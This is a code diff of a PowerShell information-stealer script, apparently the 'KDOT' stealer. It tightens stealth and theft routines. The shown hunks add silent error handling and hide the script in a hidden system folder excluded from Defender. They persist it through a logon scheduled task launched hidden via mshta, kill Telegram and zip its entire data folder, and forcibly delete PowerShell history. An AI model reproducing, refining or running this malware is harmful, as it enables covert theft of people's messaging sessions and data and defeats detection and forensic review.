@@ -4,6 +4,10 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework
 $webhook = "YOUR_WEBHOOK_HERE"
 $debug_mode = $false
 
+if (!($debug_mode)) {
+    $ErrorActionPreference = "SilentlyContinue"
+}
+
 function Invoke-Admin_Check {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $test
@@ -150,10 +154,9 @@ function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
     New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
     # Hidden Directory
-    $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
-    $KDOT_DIR.attributes="Hidden","System" 
-    $origin = $PSCommandPath
-    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
+    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
+    $KDOT_DIR.attributes = "Hidden", "System"
+    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -660,8 +663,7 @@ function Invoke-telegramstealer {
     $processname = "telegram"
     try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $destination = "$folder_messaging\Telegram.zip"
-    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
-    $files = Get-ChildItem -Path $path -Exclude $exclude
+    $files = Get-ChildItem -Path $path
     Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
 }
 
@@ -943,7 +945,9 @@ if (Invoke-Admin_Check -eq $true) {
     if (!($debug_mode)) {
         Hide-Console
     }
-    Remove-Item (Get-PSreadlineOption).HistorySavePath
+    try {
+        Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+    } catch {}
     Invoke-ANTITOTAL
     # Self-Destruct
     # Remove-Item $PSCommandPath -Force 
